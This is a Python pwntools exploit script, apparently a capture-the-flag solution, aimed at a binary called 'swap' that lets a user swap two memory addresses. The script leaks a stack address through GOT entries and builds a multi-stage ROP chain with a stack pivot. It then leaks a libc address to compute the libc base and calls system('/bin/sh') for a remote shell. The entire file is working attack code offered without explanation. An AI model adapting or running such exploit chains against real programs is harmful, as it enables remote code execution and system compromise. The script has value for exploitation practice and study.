#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('swap'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')


def set_addr(a1, a2):
    r.sendlineafter('choice: \n', '1')
    r.sendlineafter('addr\n', a1)
    r.sendlineafter('addr\n', a2)

def swap(buf=None):
    r.recvuntil('choice: \n')
    r.sendline('2' if not buf else '2'.ljust(8, '\x00') + buf, 0x10)

r = remote(HOST, PORT)

# leak
set_addr(str(elf.got['atoi']), str(elf.got['puts']))
swap()
r.send('a'*8)
stack = r.leak('a'*8)
log.info('stack: {}'.format(hex(stack)))
buf = stack - 0x1b8
log.info('buf: {}'.format(hex(buf)))
ret_addr = stack - 0x128
log.info('ret_addr: {}'.format(hex(ret_addr)))
rop = stack - 0x120
log.info('rop: {}'.format(hex(rop)))

r.send('2\x00') # swap again

# make ropchain
rop2 = 0x601800
rop3 = 0x601900

ret = 0x400699
pop_rdi = 0x400b13
pop_rsi = 0x400b11
pop_rbp = 0x4007c0
leave = 0x400931
pop_rsp = 0x400b0d

## ret to rop2
set_addr(str(buf), str(rop));        swap(p64(pop_rsp))
set_addr(str(buf), str(rop + 8));    swap(p64(rop2 - 0x18))

## rop2, leak libc addr
set_addr(str(buf), str(rop2));        swap(p64(pop_rdi))
set_addr(str(buf), str(rop2 + 8));    swap(p64(elf.got['__libc_start_main']))
set_addr(str(buf), str(rop2 + 0x10)); swap(p64(elf.sym['puts']))

## rop2, get rop3
set_addr(str(buf), str(rop2 + 0x18)); swap(p64(pop_rdi))
set_addr(str(buf), str(rop2 + 0x20)); swap(p64(0))
set_addr(str(buf), str(rop2 + 0x28)); swap(p64(pop_rsi))
set_addr(str(buf), str(rop2 + 0x30)); swap(p64(rop3))
set_addr(str(buf), str(rop2 + 0x38)); swap(p64(0))
set_addr(str(buf), str(rop2 + 0x40)); swap(p64(elf.sym['read']))

## rop2, ret to rop3
set_addr(str(buf), str(rop2 + 0x48)); swap(p64(pop_rsp))
set_addr(str(buf), str(rop2 + 0x50)); swap(p64(rop3 - 0x18))

set_addr(str(buf), str(ret_addr))
swap(p64(ret))

# shell out
libc_base = r.leak() - libc.sym['__libc_start_main']
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base
r.send(flat(pop_rdi, libc.binsh, libc.sym['system']))

r.interactive()
